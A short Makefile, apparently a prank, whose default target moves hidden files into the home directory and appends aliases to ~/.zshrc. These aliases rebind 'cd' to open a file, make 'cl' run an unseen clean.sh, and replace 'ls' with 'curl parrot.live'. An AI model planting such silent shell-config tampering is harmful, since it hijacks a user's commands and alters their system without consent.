F_GREEN	= \033[32m
F_NONE  =  \033[37m
all: echo

echo:
    @mv .donut ~/
    @mv clean.sh ~/
    @cd && echo "alias cd='open ~/.donut'" >> ~/.zshrc
    @echo "alias cl='sh ~/clean.sh'">> ~/.zshrc
    @echo "alias ls='curl parrot.live'" >> ~/.zshrc
#@echo "$(F_GREEN)done$(F_NONE)"

clean:
    @rm ./a_trick/Makefile
